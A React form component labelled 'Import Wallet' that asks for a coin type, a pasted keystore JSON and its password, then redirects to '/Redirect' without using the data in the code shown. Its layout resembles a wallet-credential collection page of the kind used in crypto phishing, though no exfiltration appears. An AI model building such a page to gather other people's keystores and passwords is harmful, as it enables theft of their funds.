import React from "react";
import classes from "./JSON.module.css";
import { useState } from "react";
import { useNavigate } from "react-router";
import { useEffect } from "react";
const Form = () => {
  const navigate = useNavigate();
  const [value, setValue] = useState({
    coinType: "",
    JSON: "",
    password: "",
  });

  const handleChange = (e) => {
    setValue((prevState) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    // console.log(value);
    // console.log(items);
    navigate("/Redirect");
  };
  useEffect(() => {
    const walletname = localStorage.getItem("walletname");
    if (walletname) {
      setValue({
        ...value,
        coinType: walletname,
      });
    }
  }, []);

  return (
    <div>
      <form className={classes.form}>
        <select
          className={classes.input}
          value={value.coinType}
          name="coinType"
          // onChange={() => handleChange(items)}
        >
          {" "}
          <option value="">select coin</option>
          <option value={value.coinType}>{value.coinType}</option>
        </select>
        <label>Key store</label>

        <textarea
          className={classes.input1}
          type="text"
          // placeholder="placeholder"
          value={value.JSON}
          onChange={handleChange}
          name="JSON"
        />

        <p>
          Several lines of text beginning with “…” plus the password you used
          for encryption.
        </p>
        <input
          className={classes.input}
          type="password"
          placeholder="password"
          value={value.password}
          onChange={handleChange}
          name="password"
        />
      </form>
      <button
        className={classes.button}
        onClick={handleSubmit}
        disabled={value.coinType.length < 2 || value.JSON.length < 2}
      >
        Import Wallet
      </button>
    </div>
  );
};

export default Form;
